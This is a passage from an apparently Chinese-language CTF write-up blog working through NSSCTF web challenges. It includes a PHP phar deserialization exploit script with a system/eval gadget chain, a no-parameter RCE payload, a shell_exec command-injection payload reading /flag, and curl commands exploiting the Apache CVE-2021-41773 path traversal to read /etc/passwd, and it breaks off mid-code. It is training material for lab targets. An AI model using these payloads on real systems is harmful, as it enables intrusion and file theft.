    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">;</span>
        <span class="token variable">$lt</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">-></span><span class="token variable">$var</span><span class="token punctuation">;</span>
        <span class="token comment">//此功能废弃，不想写了</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"404 not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">xx</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token string single-quoted-string">'eval'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token operator">=</span><span class="token string single-quoted-string">'phpinfo();'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么做法就很明显了，是phar反序列化文件上传，filter里过滤了一些伪协议</p>
<p>出口很明显在<code>xx::__call</code>的<code>$name($arg[0]);</code></p>
<p>链子：<code>aa::__destruct -&gt; zz:__toString -&gt; zz::write -&gt; ff::__get -&gt; xx::__call</code></p>
<p>这里解释一下触发<code>ff::__get</code>的操作，我们想要触发的是ff类的<code>__get</code>，就需要利用ff类的私有参数content来触发，这里看到write方法，其中的filename我们可以自己控制，但是write方法的参数里还可以触发一个，这样我们只要让filename参数<code>new ff</code>，然后$var赋值content就可以触发<code>ff::__get</code></p>
<p>所以在<code>zz:__toString</code>这里要post传参<code>method=write</code>，来调用write方法，再post传参让<code>var=content</code>来触发<code>ff::__get</code></p>
<p>exp：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">aa</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">zz</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">ff</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token operator">=</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">xx</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">zz</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token operator">=</span><span class="token string single-quoted-string">'surprise'</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">xx</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">arg</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//删除之前的test.phar文件(如果有)</span>
<span class="token variable">$phar</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//创建一个phar对象，文件名必须以phar为后缀</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//开始写文件</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//写入stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写入meta-data</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//添加要压缩的文件</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//签名自动计算</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上传成功后执行payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">file<span class="token operator">=</span>phar<span class="token punctuation">:</span><span class="token comment">//upload/4f605c9aae77e1be861cd5fb6c96b578.txt&amp;method=write&amp;var=content&amp;cmd=ls /</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231025142114489.png" alt="image-20231025142114489"></p>
<hr>
<h1 id="GXYCTF-2019-禁止套娃"><a href="#GXYCTF-2019-禁止套娃" class="headerlink" title="[GXYCTF 2019]禁止套娃"></a>[GXYCTF 2019]禁止套娃</h1><blockquote>
<p>git泄露+无参rce</p>
</blockquote>
<p>进入题目，dirsearch扫一下目录，发现存在git泄露</p>
<p>直接githacker获取源码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python GitHack.py <span class="token parameter variable">-u</span> http://node4.anna.nssctf.cn:28023/.git/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag在哪里呢？&lt;br>"</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,_]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token comment">// echo $_GET['exp'];</span>
                @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'exp'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还差一点哦！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"再好好想想！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"还想读flag，臭弟弟！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// highlight_file(__FILE__);</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一层过滤了伪协议，第二层过滤是无参rce，第三层过滤禁用了一些关键字</p>
<p>payload一把梭了：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token function">array_reverse</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="SWPUCTF-2022-新生赛-funny-web"><a href="#SWPUCTF-2022-新生赛-funny-web" class="headerlink" title="[SWPUCTF 2022 新生赛]funny_web"></a>[SWPUCTF 2022 新生赛]funny_web</h1><blockquote>
<p>弱类型</p>
</blockquote>
<p>进入题目，是一个登录框，先点击一下登录按钮看看，返回“用户名是实验室名哦~”，也就是NSS</p>
<p>用户名填入NSS，点击登录，返回“听说密码是招新群某位的QQ”，这里是2122693401，也就是谢队的（</p>
<p>成功登录，来到rea11y.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>很明显下面的<code>shell_exec</code>存在命令注入，我们只需要在action处加上管道符截断前面的语句，在data处写入我们要执行的命令</p>
<p>本地测试一下几种管道符的作用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">pwd</span><span class="token punctuation">;</span><span class="token function">ls</span>
<span class="token builtin class-name">pwd</span><span class="token operator">|</span><span class="token function">ls</span>
<span class="token builtin class-name">pwd</span><span class="token operator">||</span><span class="token function">ls</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231101104432484.png" alt="image-20231101104432484"></p>
<p>那我们在action用<code>;</code>来闭合前面的命令，然后在data命令执行，注：data这里用了引号包裹，我们需要先用引号闭合再执行我们的命令</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">action<span class="token operator">=</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>data<span class="token operator">=</span><span class="token string single-quoted-string">'cat /flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="GFCTF-2021-Baby-Web"><a href="#GFCTF-2021-Baby-Web" class="headerlink" title="[GFCTF 2021]Baby_Web"></a>[GFCTF 2021]Baby_Web</h1><blockquote>
<p>CVE-2021-41773+代码审计+无回显rce</p>
</blockquote>
<p>这题审了足足两个小时。。。</p>
<p>进入题目，f12发现提示：“源码藏在上层目录xxx.php.txt里面，但你怎么才能看到它呢?”</p>
<p>查看题目环境版本为Apache&#x2F;2.4.49 (Unix) PHP&#x2F;7.3.31-1~deb10u1</p>
<p>很明显存在CVE-2021-41773</p>
<p>尝试读取</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> --path-as-is http://node4.anna.nssctf.cn:28681/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>返回403，尝试cgi目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> --path-as-is http://node4.anna.nssctf.cn:28681/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231101131256010.png" alt="image-20231101131256010"></p>
<p>成功读取，那么直接读<code>/var/www/xxx.php.txt</code>，注：这里的xxx是要自己猜的</p>
<p>先读index.php.txt</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> --path-as-is http://node4.anna.nssctf.cn:28681/cgi-bin/.%2e/.%2e/.%2e/.%2e/var/www/index.php.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Welcome To GFCTF 12th!!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"main"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"main"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"Class.php"</span><span class="token punctuation">;</span>
<span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Temp</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$temp</span><span class="token operator">-></span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里会实例化Temp类对象并向构造方法和display方法传参</p>
<p>同时发现Class.php，读一手</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">defined</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'main'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Temp</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$date</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'version'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'1.0'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'img'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'https://www.apache.org/img/asf-estd-1999-logo.jpg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$template</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>

        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getTempName</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$dir</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./template/admin/'</span> <span class="token operator">.</span> <span class="token variable">$template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./template/index.html'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">display</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$space</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>

        <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">date</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getTempName</span><span class="token punctuation">(</span><span class="token variable">$template</span><span class="token punctuation">,</span> <span class="token variable">$space</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">template</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listdata</span><span class="token punctuation">(</span><span class="token variable">$_params</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$system</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'db'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'app'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'num'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'sum'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'form'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'page'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'site'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'flag'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'not_flag'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'show_flag'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'more'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'catid'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'field'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'order'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'space'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'table'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'table_site'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'total'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'join'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'on'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'action'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'return'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'sbpage'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'module'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'urlrule'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'pagesize'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'pagefile'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>

